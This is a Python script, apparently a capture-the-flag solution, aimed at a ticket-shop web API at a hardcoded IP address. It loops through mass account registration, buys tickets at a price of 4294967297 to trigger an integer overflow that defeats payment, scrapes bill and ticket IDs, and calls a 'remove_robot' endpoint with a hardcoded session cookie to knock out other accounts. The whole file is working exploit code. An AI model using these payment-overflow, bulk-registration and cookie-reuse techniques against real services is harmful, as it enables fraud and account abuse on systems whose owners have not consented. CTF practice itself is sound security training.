import requests
import re

for i in range(513000000,600000000):
    get_url = 'http://117.51.147.155:5050/ctf/api/register?name=%s&password=12345678' %i
    get_ticket = 'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297'


    headers = {
        'Host': '117.51.147.155:5050',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept': 'application/json',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://117.51.147.155:5050/index.html',
        'Connection': 'close',
    }

    # 添加到购物车
    s = requests.session()
    url = s.get(get_url)
    ticket_get = s.get(get_ticket)

    # 正则提取bill_id
    cut = re.split(r"[:,]", str(ticket_get.text))
    cud = str(cut[4]).replace('"','')
    pay_ticket = 'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s' %cud
    pay = s.get(pay_ticket)

    # 正则匹配id与ticket
    cun = re.split(r"[:,}]", str(pay.text))
    id = str(cun[4]).replace("'","")
    ticket = str(cun[6]).replace('"','')

    main_url = 'http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&ticket=%s' %(id,ticket)
    kill = s.get(main_url, headers={'Cookie':'user_name=123sd; REVEL_SESSION=88bd3619321062e6058167f64f0d48c9'})
    # 利用headers参数带入大号cookie
    print(kill.text)